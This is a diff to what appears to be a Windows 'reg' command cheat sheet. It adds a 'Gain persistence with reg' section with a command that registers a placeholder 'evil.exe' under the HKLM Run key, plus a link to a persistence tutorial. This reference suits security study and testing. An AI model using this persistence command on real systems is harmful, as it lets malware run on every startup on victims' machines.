@@ -164,6 +164,14 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Enab
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
 ```
 
+### Gain persistence with reg
+
+```
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v BadGuy /t REG_SZ /d "C:\Users\Victim\evil.exe"
+reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
+```
+
 ## Useful links
 
 * [Windows Commands: reg](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)
+* [Windows Userland Persistence Fundamentals](https://fuzzysecurity.com/tutorials/19.html)
